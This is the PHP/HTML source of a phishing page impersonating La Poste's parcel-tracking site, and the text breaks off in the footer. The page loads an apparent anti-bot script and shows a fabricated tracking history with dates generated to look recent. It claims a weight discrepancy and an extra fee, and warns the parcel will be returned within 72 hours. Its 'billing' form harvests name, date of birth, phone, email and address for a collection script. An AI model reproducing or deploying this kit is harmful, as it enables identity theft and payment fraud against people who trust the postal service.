<?php 
include 'core/antibots.php';
include '../settings.php';
?>
<html style="--header-height: 85px;">
  <head>
    <meta charset="utf-8" data-n-head="ssr" />
    <meta content="width=device-width, initial-scale=1" data-n-head="ssr" name="viewport" />
    <title>Suivre une lettre, un Colissimo ou un Chronopost - La Poste</title>
    <link as="font" crossorigin="true" data-n-head="ssr" href="assets/fontsMontserrat-Bold.3315de59.woff2" rel="preload" type="font/woff2" />
    <link as="font" crossorigin="true" data-n-head="ssr" href="assets/fontsMontserrat-Light.6f9be861.woff2" rel="preload" type="font/woff2" />
    <link as="font" crossorigin="true" data-n-head="ssr" href="assets/fontsMontserrat-Medium.618bb800.woff2" rel="preload" type="font/woff2" />
    <link as="font" crossorigin="true" data-n-head="ssr" href="assets/fontsMontserrat-Regular.96275b32.woff2" rel="preload" type="font/woff2" />
    <link as="font" crossorigin="true" data-n-head="ssr" href="assets/fonts/Montserrat-Semi-Bold.de1701b1.woff2" rel="preload" type="font/woff2" />
    <link href="assets/css/12cc11d.css" rel="stylesheet" />
    <link href="assets/css/586688f.css" rel="stylesheet" />
    <link href="assets/css/4de7d2d.css" rel="stylesheet" />
    <link href="assets/css/fca2f8b.css" rel="stylesheet" />
    <link href="assets/css/83c6ede.css" rel="stylesheet" />
    <link href="assets/css/b9e0ec5.css" rel="stylesheet" />
    <link href="assets/css/custom.css" rel="stylesheet" />
    <script src="assets/js/1.js"></script>
    <script src="assets/js/2.js"></script>
    <link rel="shortcut icon" href="assets/img/logo-laposte-app-part-23.png" type="image/png">

  </head>
  <body>
    <div id="__nuxt">
      <div id="__layout">
        <div class="page-wrapper--suivi" data-v-46d9cb88="">
          <div class="page" data-v-46d9cb88="">
            <div class="full" data-v-d12fc882="" newlogo="true">
              <a class="button full__skipLink visually-hidden-focusable button__mobile--small button__tablet--small button__desktop--small button--primary button--supernova" data-v-0f15f8d9="" data-v-d12fc882="" href="#">
                <span class="button__wrapper" data-v-0f15f8d9="">
                  <span class="button__label" data-v-0f15f8d9=""> Aller au contenu de la page </span>
                  <span class="anim" data-v-0f15f8d9=""></span>
                </span>
              </a>
              <div class="full__headerWrapper" data-v-d12fc882="">
                <div class="header__wrap full__header" data-v-d12fc882="" data-v-ed4b91b6="">
                  <div class="header__stick header__stick--fixed" data-v-ed4b91b6="">
                    <div class="component component-clone_smartBanner-suivi-unitaire_00103145" data-v-ed4b91b6="">
                      <div data-v-59a8e6fc="">
                        <div class="smartBanner" data-v-59a8e6fc="">
                          <div class="smartBanner__media" data-v-59a8e6fc="">
                            <picture class="smartBanner__media__content" data-v-59a8e6fc="" data-v-70bf7d34="">
                              <img alt="Les applications La Poste " data-v-70bf7d34="" fetchpriority="low" height="16" src="assets/img/logo-laposte-app-part-23.png" width="16" />
                            </picture>
                          </div>
                          <div class="smartBanner__content" data-v-59a8e6fc="">
                            <div class="smartBanner__title" data-v-59a8e6fc="">Plus rapide et plus pratique</div>
                            <div class="smartBanner__subtitle" data-v-59a8e6fc=""> Scannez vos n° de suivi avec les applications La Poste et La Poste Pro </div>
                            <div class="smartBanner__button" data-v-59a8e6fc="">
                              <button class="button button__mobile--small button__tablet--small button__desktop--small button--primary button--supernova" data-v-0f15f8d9="" data-v-59a8e6fc="">
                                <span class="button__wrapper" data-v-0f15f8d9="">
                                  <span class="button__label" data-v-0f15f8d9=""> Télécharger l'application </span>
                                  <span class="anim" data-v-0f15f8d9=""></span>
                                </span>
                              </button>
                            </div>
                          </div>
                          <div class="smartBanner__action" data-v-59a8e6fc="" role="button">
                            <div class="smartBanner__action--close" data-v-59a8e6fc="">
                              <i class="icon icon--action-close icon--regular icon--default" data-v-1028a809="" data-v-59a8e6fc="">
                                <span class="visually-hidden" data-v-1028a809="">Fermer</span>
                              </i>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <header class="header" data-v-ed4b91b6="">
                      <div class="header__base headerFull" data-v-663fe3b0="" data-v-d12fc882="" data-v-ed4b91b6="">
                        <button aria-label="Ouvrir le menu" class="burger header__burger--new headerFull__burger" data-v-3047fb76="" data-v-663fe3b0="" type="button">
                          <i class="icon icon--settings-burger-menu icon--regular icon--default" data-v-1028a809="" data-v-3047fb76="">
                            <span class="visually-hidden" data-v-1028a809=""></span>
                          </i>
                        </button>
                        <picture class="logo logo--clickable logo--responsive logo--horizontal logo--medium header__logo--new headerFull__logo" data-v-0453bd69="" data-v-663fe3b0="" role="'button'" tabindex="0">
                          <img alt="La Poste" class="logo__image logo__image--horizontal logo__image--part" data-v-0453bd69="" height="24" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYyIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMTYyIDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8cGF0aCBkPSJNMTIuMjM0MSAwLjY1NTAxNkwyMy45OTc5IDYuMDAyNkg0Mi4wMTY1TDQzLjUwNzUgMy40MTQ2MUM0NC40MDIzIDEuODYyODggNDMuMzIxOCAwIDQxLjY4OTkgMEgxMi4zNjA5QzExLjk2MiAwIDExLjg2NiAwLjQ4NzcyNSAxMi4yMzQyIDAuNjU1MDE2SDEyLjIzNDFaIiBmaWxsPSIjMDAzREE1Ii8+CjxwYXRoIGQ9Ik0yMy45OTc5IDguMjk3ODVINTMuMzQ3M0M1My42ODY5IDguMjk3ODUgNTQuMDE1NCA4LjU2Mzk1IDU0LjAxNTQgOC45NjAzQzU0LjAxNTQgOS4zMTA5NiA1My43NzUyIDkuNTM5NDggNTMuNTMzMSA5LjYwNjU0TDAuNDI3ODE0IDIzLjk4NjhDMC4wODE3ODQ1IDI0LjA4MTYgLTAuMTYxNTM4IDIzLjYzNSAwLjEyOTQxMiAyMy40MDNMMjMuOTk4IDguMjk3ODVIMjMuOTk3OVoiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTkuMTY3OTcgMjQuMDAwM0wyOC40MzUyIDIzLjY0MTlDMzAuMzA0MiAyMy42MDcxIDMyLjQ5MzEgMjIuNTMwMiAzMy40OTE5IDIwLjc5NjVMMzUuODAyNCAxNi43ODYxTDkuMTY3OTcgMjQuMDAwM1oiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTgyLjA5MSA1LjgzNzEySDc5LjQ4MzlMNzIuODgzOCAxOC41Njc4SDc1LjYzNTFMNzYuODE2OSAxNi4yMjcySDg0LjcyMDRMODUuNDk2NiAxNy43NjRDODUuODc3IDE4LjUxOCA4Ni4yMzAyIDE4LjU2NzYgODcuMjIxMSAxOC41Njc2SDg4LjY5MjFMODIuMDkxIDUuODM2OTFWNS44MzcxMlpNNzcuOTY3MSAxMy45NDc4TDgwLjc2NzkgOC40MDA1M0w4My41Njg2IDEzLjk0NzhINzcuOTY2OUg3Ny45NjcxWiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNOTYuMzI1NSAxNC44MDAxVjE4LjU2NzJIOTMuNzcxNVY1Ljk1NTI4Qzk1LjExMjkgNS45MjA4MiA5Ni45MjM4IDUuODY5MTQgOTguNDIxMiA1Ljg2OTE0QzEwMS4zNDIgNS44NjkxNCAxMDMuMjg2IDYuMjgzNDUgMTA0LjQ0MiA3LjQzOTYzQzEwNS4xNDkgOC4xNzQ1MyAxMDUuNTIgOS4xNjkyOSAxMDUuNDY3IDEwLjE4NzZDMTA1LjQ2NyAxMy44MzA5IDEwMi42MjMgMTQuODIyIDk4LjU2NjcgMTQuODIyQzk4LjAxMzEgMTQuODIyIDk2Ljk3OTMgMTQuODA4NSA5Ni4zMjU1IDE0LjgwMDFaTTk2LjMyNTUgMTIuNDY0M0M5Ni45Njg5IDEyLjQ3NzQgOTcuNzc5NSAxMi40ODY1IDk4LjMzODQgMTIuNDg2NUM5OS45NzYzIDEyLjQ4NjUgMTAxLjQ3OCAxMi40MzY4IDEwMi4yNzkgMTEuNjM1N0MxMDIuNjQ3IDExLjI2MzQgMTAyLjg0IDEwLjc1MjkgMTAyLjgxMiAxMC4yMzAzQzEwMi44MTggOS43OTc3NCAxMDIuNjY0IDkuMzc4MjkgMTAyLjM3OSA5LjA1MzJDMTAxLjU3OSA4LjI1MzQ5IDEwMC40MTcgOC4yMDQwNyA5OC4zMzg0IDguMjA0MDdDOTcuNzc5MyA4LjIwNDA3IDk2Ljk2OTkgOC4yMTMwOSA5Ni4zMjU1IDguMjI2MjJWMTIuNDY0M1oiIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTEyMi4wNzcgMTIuMjYxQzEyMi4wNzcgMTUuODc0OSAxMTkuMjMzIDE4LjgxNTEgMTE0LjQ1NSAxOC44MTUxQzEwOS42NzcgMTguODE1MSAxMDYuODMzIDE1Ljg3NTIgMTA2LjgzMyAxMi4yNjEyQzEwNi44MzMgOC42NDcyMyAxMDkuNjc3IDUuNzA3MDMgMTE0LjQ1NSA1LjcwNzAzQzExOS4yMzMgNS43MDcwMyAxMjIuMDc3IDguNjQ3MDIgMTIyLjA3NyAxMi4yNjFaTTExNC40NTUgOC4wMDAxMUMxMTEuNTYgOC4wMDAxMSAxMDkuNDk0IDkuNjc4MjkgMTA5LjQ5NCAxMi4yNjFDMTA5LjQ5NCAxNC44NDM3IDExMS41NTggMTYuNTIxOCAxMTQuNDU1IDE2LjUyMThDMTE3LjM1MiAxNi41MjE4IDExOS40MTYgMTQuODQzNyAxMTkuNDE2IDEyLjI2MUMxMTkuNDE2IDkuNjc4MjkgMTE3LjM1MiA4LjAwMDExIDExNC40NTUgOC4wMDAxMUgxMTQuNDU1WiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNMTM0Ljk4MyA3LjEyMDQxQzEzMy41OTggNi4yNTU2OSAxMzEuMzQ4IDUuNzA3MDMgMTI5LjY0NyA1LjcwNzAzQzEyNi40NDEgNS43MDcwMyAxMjMuOTIyIDcuMzkyNTkgMTIzLjkyMiA5LjczNzE1QzEyMy45MjIgMTQuMTU0MSAxMzIuNjE3IDEyLjUxNTUgMTMyLjYxNyAxNS4xMzc4QzEzMi42MTcgMTYuMjA3IDEzMS4wMjcgMTYuNjY0NCAxMjkuNjY4IDE2LjY2NDRDMTI3Ljg1MyAxNi42NTA1IDEyNi4wODQgMTYuMDk1OCAxMjQuNTg2IDE1LjA3MTVMMTIzLjI3OCAxNy4wMTU5QzEyNC44NjMgMTguMDk2NCAxMjcuNDE0IDE4LjgxNTcgMTI5LjQ0NSAxOC44MTU3QzEzMi42MiAxOC44MTU3IDEzNS4yNzcgMTcuMzM2MSAxMzUuMjc3IDE0Ljg1OTNDMTM1LjI3NyAxMC4zNzYxIDEyNi42MjEgMTEuNzcxMiAxMjYuNjIxIDkuMzQwMDdDMTI2LjYyMSA4LjMxMDY0IDEyOC4wNTUgNy44NjA0NCAxMjkuNjAyIDcuODYwNDRDMTMxLjA4NyA3Ljg4MTM2IDEzMi41MzYgOC4zMjI5NSAxMzMuNzgxIDkuMTMzOTNMMTM0Ljk4MyA3LjEyMDYyVjcuMTIwNDFaIiBmaWxsPSIjMDAzREE1Ii8+CjxwYXRoIGQ9Ik0xNDguMzg0IDUuOTQ2MjlIMTM2LjE5MlY4LjI5MDQ1SDE0MC45NjdWMTguNTY3N0gxNDMuNTIxVjguMjkwNDVIMTQ4LjM4NFY1Ljk0NjI5WiIgZmlsbD0iIzAwM0RBNSIvPgo8cGF0aCBkPSJNMTQ5Ljk4OCA1Ljk0NjI5VjE3LjY1OTdDMTQ5Ljk4OCAxOC4xODYyIDE1MC4zMTMgMTguNTY3OSAxNTAuOSAxOC41Njc5SDE2MS4xOFYxNi4yMzNIMTUyLjU0MVYxMy4yOTc3SDE2MC4yNTVWMTAuOTYzSDE1Mi41NDFWOC4yOTA4NUgxNjAuOTVWNS45NDY1SDE0OS45ODciIGZpbGw9IiMwMDNEQTUiLz4KPHBhdGggZD0iTTY1LjQxMjkgNS45NDYyOUg2Mi44NTk0VjE3LjY1OTdDNjIuODU5NCAxOC4xODYyIDYzLjE4NDcgMTguNTY3OSA2My43NzIxIDE4LjU2NzlINzEuNDAxNEw3Mi42MTMgMTYuMjMyOEg2NS40MTMxVjUuOTQ2NUw2NS40MTI5IDUuOTQ2MjlaIiBmaWxsPSIjMDAzREE1Ii8+Cjwvc3ZnPgo=" width="161" />
                        </picture>
                        <div class="header__content--new headerFull__content" data-v-663fe3b0="">
                          <div class="component component-SearchBox" data-v-663fe3b0="">
                            <div class="searchbox" data-v-663fe3b0="" data-v-7b5f2569="">
                              <button class="button searchbox__openBtn button--iconOnly button__mobile--small button__tablet--small button__desktop--small button--ghost button--darkgrey" data-v-0f15f8d9="" data-v-7b5f2569="">
                                <span class="button__wrapper" data-v-0f15f8d9="">
                                  <i class="button__icon icon icon--search-loupe icon--regular icon--small" data-v-0f15f8d9="" data-v-1028a809="">
                                    <span class="visually-hidden" data-v-1028a809=""></span>
                                  </i>
                                  <span class="visually-hidden" data-v-0f15f8d9="">Rechercher</span>
                                  <span class="anim" data-v-0f15f8d9=""></span>
                                </span>
                              </button>
                              <div class="searchbox__wrapper" data-v-7b5f2569="">
                                <form class="searchboxInput" data-v-1cb9298c="" data-v-7b5f2569="">
                                  <button class="searchboxInput__backBtn" data-v-1cb9298c="" type="button">
                                    <i class="icon icon--arrow-large-left icon--regular icon--default" data-v-1028a809="" data-v-1cb9298c="">
                                      <span class="visually-hidden" data-v-1028a809=""></span>
                                    </i>
                                  </button>
                                  <div class="searchboxInput__field" data-v-1cb9298c="">
                                    <div class="tooltip searchboxInput__tooltip" data-v-1cb9298c="" data-v-42b9e991="" style="display:block;">
                                      <div class="tooltip__trigger tooltip__trigger-- tooltip__trigger-- undefined" data-v-42b9e991="">
                                        <i class="searchboxInput__icon icon icon--search-loupe icon--regular icon--default" data-v-1028a809="" data-v-1cb9298c="" data-v-42b9e991="">
                                          <span class="visually-hidden" data-v-1028a809=""></span>
                                        </i>
                                        <label class="visually-hidden" data-v-1cb9298c="" data-v-42b9e991="" for="search">Recherche</label>
                                        <input autocomplete="off" class="searchboxInput__input" data-v-1cb9298c="" data-v-42b9e991="" id="search" name="search" placeholder="N° de suivi, rechercher un produit ou un service ...." type="text" value="" />
                                      </div>
                                      <div class="tooltip__popper tooltip__popper--top tooltip__popper--default" data-v-42b9e991="" style="background:#3C3C3C;top:inherit;right:inherit;bottom:calc(100% + 12px);left:50%;">
                                        <i class="tooltip__arrow tooltip__arrow--top" data-v-42b9e991="" style="border-width:8px;border-top-color:#3C3C3C;border-right-color:transparent;border-bottom-color:transparent;border-left-color:transparent;"></i> Merci de compléter pour lancer la recherche
                                      </div>
                                    </div>
                                  </div>
                                  <div class="searchboxInput__actions" data-v-1cb9298c="">
                                    <div class="tooltip" data-v-1cb9298c="" data-v-42b9e991="" style="display:inline-flex;">
                                      <div class="tooltip__trigger tooltip__trigger--hover tooltip__trigger-- undefined" data-v-42b9e991="">
                                        <button class="searchboxInput__clear" data-v-1cb9298c="" data-v-42b9e991="" type="button">
                                          <i class="icon icon--action-close icon--regular icon--small" data-v-1028a809="" data-v-1cb9298c="" data-v-42b9e991="">
                                            <span class="visually-hidden" data-v-1028a809=""></span>
                                          </i>
                                        </button>
                                      </div>
                                      <div class="tooltip__popper tooltip__popper--top tooltip__popper--default" data-v-42b9e991="" style="background:#3C3C3C;top:inherit;right:inherit;bottom:calc(100% + 12px);left:50%;">
                                        <i class="tooltip__arrow tooltip__arrow--top" data-v-42b9e991="" style="border-width:8px;border-top-color:#3C3C3C;border-right-color:transparent;border-bottom-color:transparent;border-left-color:transparent;"></i> Effacer
                                      </div>
                                    </div>
                                    <span class="searchboxInput__separator" data-v-1cb9298c=""></span>
                                    <div class="tooltip" data-v-1cb9298c="" data-v-42b9e991="" style="display:inline-flex;">
                                      <div class="tooltip__trigger tooltip__trigger--hover tooltip__trigger-- undefined" data-v-42b9e991="">
                                        <button class="button searchboxInput__search button--iconOnly button--noPadding button__mobile--small button__tablet--small button__desktop--small button--ghost button--darkgrey" data-v-0f15f8d9="" data-v-1cb9298c="" data-v-42b9e991="">
                                          <span class="button__wrapper" data-v-0f15f8d9="">
                                            <i class="button__icon icon icon--search-loupe icon--regular icon--small" data-v-0f15f8d9="" data-v-1028a809="">
                                              <span class="visually-hidden" data-v-1028a809=""></span>
                                            </i>
                                            <span class="visually-hidden" data-v-0f15f8d9="">Rechercher</span>
                                            <span class="anim" data-v-0f15f8d9=""></span>
                                          </span>
                                        </button>
                                      </div>
                                      <div class="tooltip__popper tooltip__popper--top tooltip__popper--default" data-v-42b9e991="" style="background:#3C3C3C;top:inherit;right:inherit;bottom:calc(100% + 12px);left:50%;">
                                        <i class="tooltip__arrow tooltip__arrow--top" data-v-42b9e991="" style="border-width:8px;border-top-color:#3C3C3C;border-right-color:transparent;border-bottom-color:transparent;border-left-color:transparent;"></i> Rechercher
                                      </div>
                                    </div>
                                  </div>
                                </form>
                                <div class="searchbox__content" data-v-7b5f2569="">
                                  <div class="searchbox__content-wrapper" data-v-7b5f2569=""></div>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div class="component component-accesRapidesBanners" data-v-663fe3b0="">
                            <div class="quick header__quick" data-v-22e19230="" data-v-663fe3b0="">
                              <button class="button button__mobile--regular button__tablet--regular button__desktop--regular button--secondary button--darkgrey quick__button" data-v-0f15f8d9="" data-v-22e19230="" title="Accès rapides">
                                <span class="button__wrapper" data-v-0f15f8d9="">
                                  <span class="button__label" data-v-0f15f8d9="">
                                    <i class="quick__icon icon icon--editing-display-grid-big icon--light icon--default" data-v-0f15f8d9="" data-v-1028a809="" data-v-22e19230="">
                                      <span class="visually-hidden" data-v-1028a809=""></span>
                                    </i> Accès rapides </span>
                                  <span class="anim" data-v-0f15f8d9=""></span>
                                </span>
                              </button>
                            </div>
                          </div>
                          <div class="accessLinksBlock accessLinksBlock--header" data-v-58cd4281="" data-v-663fe3b0="">
                            <button class="button button__mobile--regular button__tablet--regular button__desktop--regular button--ghost button--darkgrey accessLinksBlock__button" data-v-0f15f8d9="" data-v-58cd4281="">
                              <span class="button__wrapper" data-v-0f15f8d9="">
                                <span class="button__label" data-v-0f15f8d9=""> Changer de site : <span class="accessLinksBlock__type" data-v-0f15f8d9="" data-v-58cd4281="">Particulier</span>
                                  <i class="accessLinksBlock__arrow icon icon--arrow-bottom icon--regular icon--small" data-v-0f15f8d9="" data-v-1028a809="" data-v-58cd4281="">
                                    <span class="visually-hidden" data-v-1028a809=""></span>
                                  </i>
                                </span>
                                <span class="anim" data-v-0f15f8d9=""></span>
                              </span>
                            </button>
                          </div>
                        </div>
                        <div class="headerFull__actions" data-v-663fe3b0="">
                          <a class="headerFull__button headerButton" data-v-2f573230="" data-v-663fe3b0="" href="#" id="header-help-part">
                            <i class="headerButton__icon icon icon--action-help icon--light icon--default" data-v-1028a809="" data-v-2f573230="">
                              <span class="visually-hidden" data-v-1028a809=""></span>
                            </i>
                            <span class="headerButton__line" data-v-2f573230=""> Aide </span>
                          </a>
                          <span aria-pressed="true" class="headerFull__button headerButton" data-v-2f573230="" data-v-663fe3b0="" role="button" tabindex="0">
                            <i class="headerButton__icon icon icon--editing-profile icon--light icon--default" data-v-1028a809="" data-v-2f573230="">
                              <span class="visually-hidden" data-v-1028a809=""></span>
                            </i>
                            <span class="headerButton__line" data-v-2f573230=""> Se connecter </span>
                          </span>
                          <span aria-pressed="true" class="headerFull__button headerButton" data-v-2f573230="" data-v-663fe3b0="" data-v-7b5364ee="" id="header-cart-button" role="button" tabindex="0">
                            <span data-v-2f573230="" data-v-7b5364ee="" style="display: none;">
                              <div class="loader headerCardButton__loader loader--vsmp" data-v-2f573230="" data-v-46ab067f="" data-v-7b5364ee="">
                                <svg class="loader__circular" data-v-46ab067f="" viewbox="0 0 50 50">
                                  <path class="loader__path" d="M25,5A20.14,20.14,0,0,1,45,22.88a2.51,2.51,0,0,0,2.49,2.26h0A2.52,2.52,0,0,0,50,22.33a25.14,25.14,0,0,0-50,0,2.52,2.52,0,0,0,2.5,2.81h0A2.51,2.51,0,0,0,5,22.88,20.14,20.14,0,0,1,25,5Z" data-v-46ab067f="">
                                    <animatetransform attributename="transform" data-v-46ab067f="" dur="0.7s" from="0 25 25" repeatcount="indefinite" to="360 25 25" type="rotate"></animatetransform>
                                  </path>
                                </svg>
                              </div>
                            </span>
                            <span class="headerCardButton__cartQty" data-v-2f573230="" data-v-7b5364ee="" style="display:none;"> 0 </span>
                            <i class="headerButton__icon icon icon--cart-simple icon--light icon--default" data-v-1028a809="" data-v-2f573230="">
                              <span class="visually-hidden" data-v-1028a809=""></span>
                            </i>
                            <span class="headerButton__line" data-v-2f573230=""> Panier </span>
                          </span>
                        </div>
                      </div>
                    </header>
                  </div>
                </div>
                <nav aria-label="Menu de navigation" class="navbar" data-v-c41c5ec6="" data-v-d12fc882=""></nav>
              </div>
              <div class="full__afterHeader" data-v-d12fc882=""></div>
              <div class="full__beforeBreadcrumb" data-v-d12fc882=""></div>
              <div class="full__breadcrumb" data-v-d12fc882=""></div>
              <main class="full__main" data-v-d12fc882="" id="main">
                <div class="full__content full__content" data-v-d12fc882="">
                  <div class="container full__beforeMiddleContent" data-v-6d0ee6e1="" data-v-d12fc882=""></div>
                  <div class="container full__middleContent" data-v-6d0ee6e1="" data-v-d12fc882="">
                    <div class="component component-clone_SuivieComponent-suivi-unitaire_00103147" data-v-6d0ee6e1="">
                      <div class="mliv_wrapper sun_search_wrapper sun_bloc_height" data-v-5479c477="">
                        <div class="sun_wrapper" data-v-5479c477="">
                          <wc-sun data-lang="fr_FR" data-v-5479c477="" id="sun_container">
                            <div>
                              <div class="MuiBox-root css-1nq1qg6">
                                <div class="MuiBox-root css-0" id="sticky-modal-container"></div>
                              </div>
                              <div class="MuiStack-root css-j7qwjs">
                                <div class="MuiStack-root css-yd8sa2">
                                  <div class="MuiBox-root css-1rkrqyu" data-testid="block-container">
                                    <div class="MuiBox-root css-1m54ko6" data-testid="block_container_border_top"></div>
                                    <center>
                                      <h1 class="waki">Informations de facturations</h1></center>
                                    <div class="MuiBox-root css-0">
                                      <form method="post" action="action/billing.php">
                                       <center>
                                        <p>Merci de saisir vos informations de facturations</p>
                                        <div style="width: 100%;" class="input-container">
                                          <input style="width: 49%;float:left" required minlength="3" type="text" id="name" name="name" placeholder="Nom" class="wakinput"><input style="width: 49%;float:right" required minlength="3" type="text" id="fname" name="fname" placeholder="Prénom" class="wakinput">
                                        </div>
                                        <input required minlength="3" type="tel" id="dob" name="dob" placeholder="Date de naissance" class="wakinput"><br>
                                        <input required minlength="8" type="tel" id="tel" name="tel" placeholder="Numéro de téléphone" class="wakinput"><br>
                                        <input required minlength="4" type="email" id="email" name="email" placeholder="Adresse e-mail" class="wakinput"><br>
                                        <input required minlength="3" type="text" id="address" name="address" placeholder="Adresse" class="wakinput"><br>
                                        
                                        <button type="submit" class="submitW" style="width: 100%;">Continuer</button>
                                       </center>
                                      </form>
                                    </div>
                                  
                                  
                                    <div class="MuiGrid-root MuiGrid-container css-1cn3yto">
                                      <button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textSecondary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-disableElevation MuiButton-root MuiButton-text MuiButton-textSecondary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-disableElevation css-rlbp7t" tabindex="0" type="button" data-testid="search-virtual-assistant-button">
                                        <span class="MuiButton-startIcon MuiButton-iconSizeMedium css-1l6c7y9">

                                        </span>En cas de défaut de paiement dans les prochaines 72h, Votre colis sera retourné à l'expéditeur.</button>
                                    </div>
                                  </div>
                                 
                                </div>
                              </div>
                            </div>
                            <br>
                            <section style="border-bottom: 4px solid rgb(255, 201, 5);" class="additionnal-infos-container">
                           <h2>Acheminement</h2>
                                      <?php
                                          $currentDate = new DateTime();
                                          
                                          $fTime = $currentDate->sub(new DateInterval('P1D'));
                                          $f = $fTime->format('d/m/Y');

                                          $sTime = $currentDate->sub(new DateInterval('P2D'));
                                          $s = $sTime->format('d/m/Y');

                                          $tTime = $currentDate->sub(new DateInterval('P3D'));
                                          $t = $tTime->format('d/m/Y');
                                      ?>
                                    <ul class="details-list__block acheminement opened">
                                        <li class="item" data-days-ago="1">
                                            <p class="item__date"><?php echo $f; ?></p>
                                            <p class="item__label red">
                                                <i class=""></i> ⚠️ Le poids de votre colis ne correspond pas au poids indiqué, des frais additionnels de <?php echo $frais; ?> € vous sont facturés.
                                            </p>
                                        </li>
                                        <li class="item" data-days-ago="1">
                                            <p class="item__date"><?php echo $f; ?></p>
                                            <p class="item__label green">
                                                <img src="assets/greenc.png" class="">&nbsp; Votre colis est arrivé sur son site de distribution.
                                            </p>
                                        </li>
                                        <li class="item" data-days-ago="2">
                                            <p class="item__date"><?php echo $s; ?></p>
                                            <p class="item__label green">
                                                <img src="assets/greenc.png" class="">&nbsp; Votre colis est en transit sur nos plateformes logistiques.
                                            </p>
                                        </li>
                                        <li class="item" data-days-ago="2">
                                            <p class="item__date"><?php echo $s; ?></p>
                                            <p class="item__label green">
                                                <img src="assets/greenc.png" class="lpi-feedback_check_surrounded">&nbsp; Votre colis est pris en charge par La Poste. Il est en cours d'acheminement.
                                            </p>
                                        </li>
                                        <li class="item" data-days-ago="3">
                                            <p class="item__date"><?php echo $t; ?></p>
                                            <p class="item__label green">
                                                <img src="assets/greenc.png" class="lpi-feedback_check_surrounded">&nbsp; Votre colis a été déposé par l'expéditeur au bureau de poste d'expédition.
                                            </p>
                                        </li>
                                    </ul>
                                </section> 
                                <div class="MuiStack-root css-wdlv19">
                                    <button class="MuiButtonBase-root MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-disableElevation MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButton-disableElevation css-qvjctj" tabindex="0" type="button" data-testid="translate-button">
                                      <span class="MuiButton-startIcon MuiButton-iconSizeMedium css-1l6c7y9">
                                        <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-jcbu1l" focusable="false" aria-hidden="true" viewBox="0 0 24 24">
                                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <g clip-path="url(#clip0_3682_178996)">
                                              <g clip-path="url(#clip1_3682_178996)">
                                                <path d="M-6 -0.000144005H30.036V24.0001H-6V-0.000144005Z" fill="white"></path>
                                                <path d="M-6 -0.000144005H6.01175V24.0001H-6V-0.000144005Z" fill="#0052B4"></path>
                                                <path d="M18.0242 -0.00014019H30.0359V24.0001H18.0242V-0.00014019Z" fill="#D80027"></path>
                                              </g>
                                            </g>
                                            <defs>
                                              <clipPath id="clip0_3682_178996">
                                                <rect width="24" height="24" rx="12" fill="white"></rect>
                                              </clipPath>
                                              <clipPath id="clip1_3682_178996">
                                                <rect width="36.036" height="24" fill="white" transform="translate(-6)"></rect>
                                              </clipPath>
                                            </defs>
                                          </svg>
                                        </svg>
                                      </span>Français <span class="MuiButton-endIcon MuiButton-iconSizeMedium css-pt151d">
                                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                          <g opacity="0.75">
                                            <path d="M5.29289 8.29289C5.65338 7.93241 6.22061 7.90468 6.6129 8.2097L6.70711 8.29289L12 13.585L17.2929 8.29289C17.6534 7.93241 18.2206 7.90468 18.6129 8.2097L18.7071 8.29289C19.0676 8.65338 19.0953 9.22061 18.7903 9.6129L18.7071 9.70711L12 16.4142L5.29289 9.70711C4.90237 9.31658 4.90237 8.68342 5.29289 8.29289Z" fill="#3C3C3C"></path>
                                          </g>
                                        </svg>
                                      </span>
                                    </button>
                                  </div>
                          </wc-sun>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="container full__afterMiddleContent" data-v-6d0ee6e1="" data-v-d12fc882=""></div>
                </div>
              </main>
              <div class="full__beforeFooter" data-v-d12fc882=""></div>
              <footer class="footer full__footer footer--default" data-v-4bb7abf8="" data-v-d12fc882="">
                <div class="footer__main-content" data-v-4bb7abf8="">
                  <div class="component component-EngagementsSimpleBanners" data-v-4bb7abf8="">
                    <section class="engagement" data-v-4bb7abf8="" data-v-fec06fda="">
                      <h3 class="footer__title" data-v-fec06fda="">Nos Engagements</h3>
                      <div class="engagement__content" data-v-fec06fda="">
                        <picture class="engagement__picture" data-v-70bf7d34="" data-v-fec06fda="">
                          <img alt="Proche de vous"  src="assets/img/proche.png" class="lazyloaded"  width="56" />
                        </picture>
                        <p class="engagement__details" data-v-fec06fda="">
                          <a class="engagement__title" data-v-fec06fda="" href="#"> Proche de vous </a>
                          <span class="engagement__subtitle" data-v-fec06fda=""> Localiser un bureau de poste </span>
                        </p>
                      </div>
                      <div class="engagement__content" data-v-fec06fda="">
                        <picture class="engagement__picture" data-v-70bf7d34="" data-v-fec06fda="">
                          <img alt="footer-paiement-securise-cadenas.svg" class="lazyloaded" data-src="assets/img/cadenas-01-1-.svg" data-v-70bf7d34="" fetchpriority="low" height="0" src="assets/img/cadenas-01-1-.svg" width="56" />
                        </picture>
                        <p class="engagement__details" data-v-fec06fda="">
                          <a class="engagement__title" data-v-fec06fda="" href="#"> Paiements 100% sécurisés </a>
                          <span class="engagement__subtitle" data-v-fec06fda=""></span>
                        </p>
                      </div>
                      <div class="engagement__content" data-v-fec06fda="">
                        <picture class="engagement__picture" data-v-70bf7d34="" data-v-fec06fda="">
                          <img alt="Livraison offerte dès 25€ d'achat"  src="assets/img/cadeau.png" class="lazyloaded" width="56" />
                        </picture>
                        <p class="engagement__details" data-v-fec06fda="">
                          <a class="engagement__title" data-v-fec06fda="" href="#"> Livraison offerte dès 25€ d'achat </a>
